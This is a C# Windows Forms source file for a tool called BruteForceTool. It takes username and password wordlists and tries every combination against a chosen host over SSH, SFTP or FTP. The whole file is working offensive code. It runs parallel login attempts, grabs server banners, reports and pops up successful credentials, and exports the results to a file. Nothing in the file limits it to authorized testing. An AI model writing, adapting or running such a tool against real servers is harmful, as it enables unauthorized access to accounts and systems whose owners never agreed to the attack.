using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Renci.SshNet;
using FluentFTP;

namespace BruteForceTool
{
    public partial class MainForm : Form
    {
        private CancellationTokenSource cancellationTokenSource;
        private bool attackInProgress = false;
        private int totalAttempts = 0;
        private int successfulAttempts = 0;

        public MainForm()
        {
            InitializeComponent();
            InitializeProtocolComboBox();
            UpdateControlStates();
        }

        private void InitializeProtocolComboBox()
        {
            cmbProtocol.Items.AddRange(new object[] { "SSH", "SFTP", "FTP" });
            cmbProtocol.SelectedIndex = 0;
        }

        private void btnBrowseUsername_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtUsernameFile.Text = openFileDialog.FileName;
                }
            }
        }

        private void btnBrowsePassword_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtPasswordFile.Text = openFileDialog.FileName;
                }
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (attackInProgress)
            {
                StopAttack();
                return;
            }

            if (ValidateInputs())
            {
                StartAttack();
            }
        }

        private bool ValidateInputs()
        {
            if (string.IsNullOrWhiteSpace(txtTarget.Text))
            {
                MessageBox.Show("Please enter a target hostname or IP address.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            if (string.IsNullOrWhiteSpace(txtUsernameFile.Text) || !File.Exists(txtUsernameFile.Text))
            {
                MessageBox.Show("Please select a valid username file.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            if (string.IsNullOrWhiteSpace(txtPasswordFile.Text) || !File.Exists(txtPasswordFile.Text))
            {
                MessageBox.Show("Please select a valid password file.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            return true;
        }

        private async void StartAttack()
        {
            attackInProgress = true;
            totalAttempts = 0;
            successfulAttempts = 0;
            lstResults.Items.Clear();
            UpdateControlStates();

            string target = txtTarget.Text;
            string protocol = cmbProtocol.SelectedItem.ToString();
            int delay = (int)numDelay.Value;
            int threads = (int)numThreads.Value;
            bool continueAfterSuccess = chkContinue.Checked;

            try
            {
                cancellationTokenSource = new CancellationTokenSource();
                var token = cancellationTokenSource.Token;

                // Get server banner
                string banner = await GetServerBannerAsync(target, protocol);
                if (!string.IsNullOrEmpty(banner))
                {
                    LogMessage($"Server Banner: {banner}", Color.Blue);
                }

                // Read credentials
                var usernames = await ReadLinesAsync(txtUsernameFile.Text, token);
                var passwords = await ReadLinesAsync(txtPasswordFile.Text, token);

                LogMessage($"Starting {protocol} brute force attack on {target}", Color.Green);
                LogMessage($"Usernames: {usernames.Count}, Passwords: {passwords.Count}", Color.Gray);

                // Process credentials with parallel processing
                var options = new ParallelOptions
                {
                    MaxDegreeOfParallelism = threads,
                    CancellationToken = token
                };

                await Task.Run(() =>
                {
                    Parallel.ForEach(usernames, options, username =>
                    {
                        if (token.IsCancellationRequested)
                            return;

                        foreach (var password in passwords)
                        {
                            if (token.IsCancellationRequested)
                                break;

                            if (!continueAfterSuccess && successfulAttempts > 0)
                                break;

                            Interlocked.Increment(ref totalAttempts);
                            UpdateStats();

                            var result = TestCredentials(target, username, password, protocol);

                            this.Invoke((MethodInvoker)delegate
                            {
                                LogAttempt(username, password, result);
                            });

                            if (result.Success)
                            {
                                Interlocked.Increment(ref successfulAttempts);
                                LogMessage($"SUCCESS: {username}:{password}", Color.Green, true);
                                
                                if (!continueAfterSuccess)
                                {
                                    cancellationTokenSource.Cancel();
                                    break;
                                }
                            }

                            if (delay > 0)
                            {
                                Thread.Sleep(delay * 1000);
                            }

                            options.CancellationToken.ThrowIfCancellationRequested();
                        }
                    });
                });

                if (successfulAttempts == 0)
                {
                    LogMessage("Attack completed. No valid credentials found.", Color.Orange);
                }
                else
                {
                    LogMessage($"Attack completed. Found {successfulAttempts} valid credential(s).", Color.Green);
                }
            }
            catch (OperationCanceledException)
            {
                LogMessage("Attack cancelled by user.", Color.Orange);
            }
            catch (Exception ex)
            {
                LogMessage($"Error: {ex.Message}", Color.Red);
            }
            finally
            {
                StopAttack();
            }
        }

        private void StopAttack()
        {
            attackInProgress = false;
            cancellationTokenSource?.Cancel();
            UpdateControlStates();
        }

        private AuthenticationResult TestCredentials(string target, string username, string password, string protocol)
        {
            switch (protocol)
            {
                case "SSH":
                case "SFTP":
                    return TestSshSftpCredentials(target, username, password);
                case "FTP":
                    return TestFtpCredentials(target, username, password);
                default:
                    return new AuthenticationResult { Success = false, ServiceAvailable = false };
            }
        }

        private AuthenticationResult TestSshSftpCredentials(string target, string username, string password)
        {
            var result = new AuthenticationResult();

            try
            {
                // Test TCP connection first
                using (var tcpClient = new TcpClient())
                {
                    var asyncResult = tcpClient.BeginConnect(target, 22, null, null);
                    if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5)))
                    {
                        result.ServiceAvailable = false;
                        return result;
                    }
                }

                // Test SSH/SFTP connection
                using (var client = new SshClient(target, username, password))
                {
                    client.ConnectTimeout = TimeSpan.FromSeconds(10);
                    client.Connect();
                    
                    if (client.IsConnected)
                    {
                        result.Success = true;
                        result.ServiceAvailable = true;
                        
                        // For SFTP, test file operations
                        if (cmbProtocol.SelectedItem.ToString() == "SFTP")
                        {
                            using (var sftpClient = new SftpClient(target, username, password))
                            {
                                sftpClient.Connect();
                                if (sftpClient.IsConnected)
                                {
                                    sftpClient.Disconnect();
                                }
                            }
                        }
                        
                        client.Disconnect();
                    }
                }
            }
            catch (Renci.SshNet.Common.SshAuthenticationException)
            {
                result.Success = false;
                result.ServiceAvailable = true;
            }
            catch (SocketException)
            {
                result.Success = false;
                result.ServiceAvailable = false;
            }
            catch (Exception)
            {
                result.Success = false;
                result.ServiceAvailable = true;
            }

            return result;
        }

        private AuthenticationResult TestFtpCredentials(string target, string username, string password)
        {
            var result = new AuthenticationResult();

            try
            {
                using (var ftpClient = new FtpClient(target, username, password))
                {
                    ftpClient.ConnectTimeout = 10000; // 10 seconds
                    ftpClient.Connect();
                    
                    if (ftpClient.IsConnected)
                    {
                        result.Success = true;
                        result.ServiceAvailable = true;
                        ftpClient.Disconnect();
                    }
                }
            }
            catch (FluentFTP.Exceptions.FtpAuthenticationException)
            {
                result.Success = false;
                result.ServiceAvailable = true;
            }
            catch (SocketException)
            {
                result.Success = false;
                result.ServiceAvailable = false;
            }
            catch (Exception)
            {
                result.Success = false;
                result.ServiceAvailable = true;
            }

            return result;
        }

        private async Task<string> GetServerBannerAsync(string target, string protocol)
        {
            return await Task.Run(() =>
            {
                try
                {
                    int port = protocol == "FTP" ? 21 : 22;
                    
                    using (var client = new TcpClient())
                    {
                        var asyncResult = client.BeginConnect(target, port, null, null);
                        if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5)))
                        {
                            return null;
                        }

                        using (var stream = client.GetStream())
                        {
                            byte[] buffer = new byte[1024];
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            return Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                        }
                    }
                }
                catch
                {
                    return null;
                }
            });
        }

        private async Task<List<string>> ReadLinesAsync(string filePath, CancellationToken token)
        {
            return await Task.Run(() =>
            {
                var lines = new List<string>();
                using (var reader = new StreamReader(filePath))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        if (token.IsCancellationRequested)
                            break;
                        
                        if (!string.IsNullOrWhiteSpace(line))
                            lines.Add(line.Trim());
                    }
                }
                return lines;
            });
        }

        private void LogAttempt(string username, string password, AuthenticationResult result)
        {
            string status = result.Success ? "SUCCESS" : "FAILED";
            string serviceStatus = result.ServiceAvailable ? "Service available" : "Service unavailable";
            
            var item = new ListViewItem(new[] {
                DateTime.Now.ToString("HH:mm:ss"),
                username,
                password,
                status,
                serviceStatus
            });
            
            item.ForeColor = result.Success ? Color.Green : (result.ServiceAvailable ? Color.Red : Color.Gray);
            lstResults.Items.Insert(0, item);
        }

        private void LogMessage(string message, Color color, bool showMessageBox = false)
        {
            this.Invoke((MethodInvoker)delegate
            {
                txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}");
                
                if (showMessageBox)
                {
                    MessageBox.Show(message, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            });
        }

        private void UpdateStats()
        {
            this.Invoke((MethodInvoker)delegate
            {
                lblStats.Text = $"Attempts: {totalAttempts} | Success: {successfulAttempts}";
            });
        }

        private void UpdateControlStates()
        {
            btnStart.Text = attackInProgress ? "Stop Attack" : "Start Attack";
            btnStart.BackColor = attackInProgress ? Color.OrangeRed : Color.FromArgb(64, 64, 64);
            
            txtTarget.Enabled = !attackInProgress;
            cmbProtocol.Enabled = !attackInProgress;
            txtUsernameFile.Enabled = !attackInProgress;
            txtPasswordFile.Enabled = !attackInProgress;
            btnBrowseUsername.Enabled = !attackInProgress;
            btnBrowsePassword.Enabled = !attackInProgress;
            numDelay.Enabled = !attackInProgress;
            numThreads.Enabled = !attackInProgress;
            chkContinue.Enabled = !attackInProgress;
        }

        private void btnClearLog_Click(object sender, EventArgs e)
        {
            txtLog.Clear();
            lstResults.Items.Clear();
        }

        private void btnExport_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text files (*.txt)|*.txt|CSV files (*.csv)|*.csv";
                saveFileDialog.DefaultExt = "txt";
                
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter writer = new StreamWriter(saveFileDialog.FileName))
                    {
                        writer.WriteLine($"Brute Force Results - {DateTime.Now}");
                        writer.WriteLine($"Target: {txtTarget.Text}");
                        writer.WriteLine($"Protocol: {cmbProtocol.SelectedItem}");
                        writer.WriteLine();
                        writer.WriteLine("Time,Username,Password,Status,Service Status");
                        
                        foreach (ListViewItem item in lstResults.Items)
                        {
                            writer.WriteLine($"{item.SubItems[0].Text},{item.SubItems[1].Text},{item.SubItems[2].Text},{item.SubItems[3].Text},{item.SubItems[4].Text}");
                        }
                    }
                    
                    MessageBox.Show($"Results exported to {saveFileDialog.FileName}", "Export Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }

    public class AuthenticationResult
    {
        public bool Success { get; set; }
        public bool ServiceAvailable { get; set; }
    }
}
